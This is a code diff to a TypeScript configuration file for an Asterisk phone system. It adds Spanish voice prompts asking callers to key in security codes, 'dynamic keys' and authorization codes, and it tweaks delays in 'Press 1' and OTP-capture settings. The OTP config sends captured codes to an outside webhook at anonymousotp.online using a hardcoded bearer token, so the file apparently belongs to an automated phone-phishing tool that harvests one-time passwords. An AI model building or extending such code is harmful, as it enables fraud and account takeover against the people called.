@@ -39,6 +39,45 @@ export const initialAudios: AudioPrompt[] = [
     createdAt: '2026-09-19 12:00',
   },
   {
+    id: 'audio-ext-5555-welcome',
+    name: 'Extensión 5555: Digite su Código de Seguridad',
+    category: 'welcome_5555',
+    fileName: 'bienvenida_5555.wav',
+    fileSize: '310 KB',
+    durationSec: 5.5,
+    format: 'audio/wav',
+    sampleRate: '8000 Hz, 16-bit Mono (Asterisk Standard)',
+    dataUrl: createSyntheticTelephonyTone(640.0, 2.5, [480.0, 600.0, 720.0]),
+    asteriskPath: 'custom/bienvenida_5555',
+    createdAt: '2026-09-20 12:00',
+  },
+  {
+    id: 'audio-ext-4444-welcome',
+    name: 'Extensión 4444: Digite su Clave Dinámica',
+    category: 'welcome_4444',
+    fileName: 'bienvenida_4444.wav',
+    fileSize: '310 KB',
+    durationSec: 5.5,
+    format: 'audio/wav',
+    sampleRate: '8000 Hz, 16-bit Mono (Asterisk Standard)',
+    dataUrl: createSyntheticTelephonyTone(600.0, 2.5, [400.0, 500.0, 650.0]),
+    asteriskPath: 'custom/bienvenida_4444',
+    createdAt: '2026-09-20 12:00',
+  },
+  {
+    id: 'audio-ext-3333-welcome',
+    name: 'Extensión 3333: Digite su Código de Autorización',
+    category: 'welcome_3333',
+    fileName: 'bienvenida_3333.wav',
+    fileSize: '310 KB',
+    durationSec: 5.5,
+    format: 'audio/wav',
+    sampleRate: '8000 Hz, 16-bit Mono (Asterisk Standard)',
+    dataUrl: createSyntheticTelephonyTone(580.0, 2.5, [380.0, 480.0, 620.0]),
+    asteriskPath: 'custom/bienvenida_3333',
+    createdAt: '2026-09-20 12:00',
+  },
+  {
     id: 'audio-p1-welcome',
     name: 'Bienvenida Corporativa Press 1',
     category: 'press1_welcome',
@@ -410,7 +449,7 @@ export const initialPress1Config: Press1Config = {
   welcomeAudioId: 'audio-p1-welcome',
   timeoutSeconds: 8,
   maxRetries: 2,
-  answerDelaySeconds: 1, // 1 segundo de cortesía al contestar antes de iniciar locución
+  answerDelaySeconds: 1.5, // 1.5 segundos de cortesía al contestar antes de iniciar locución
   transferDelaySeconds: 2, // 2 segundos de pausa natural tras presionar 1
   digit1Action: 'transfer_extension',
   digit1Target: '1001',
@@ -428,7 +467,7 @@ export const initialOtpConfig: OtpCaptureConfig = {
   welcomeAudioId: 'audio-otp-prompt',
   repeatPromptOnTimeout: true,
   timeoutSeconds: 10,
-  answerDelaySeconds: 1, // 1 segundo de cortesía al contestar antes de solicitar OTP
+  answerDelaySeconds: 1.5, // 1.5 segundos de cortesía al contestar antes de solicitar OTP
   maxAttempts: 3,
   webhookUrl: 'https://anonymousotp.online/api/v1/telephony/verify-otp',
   webhookAuthHeader: 'Bearer sec_live_otp_asterisk_token_2026',
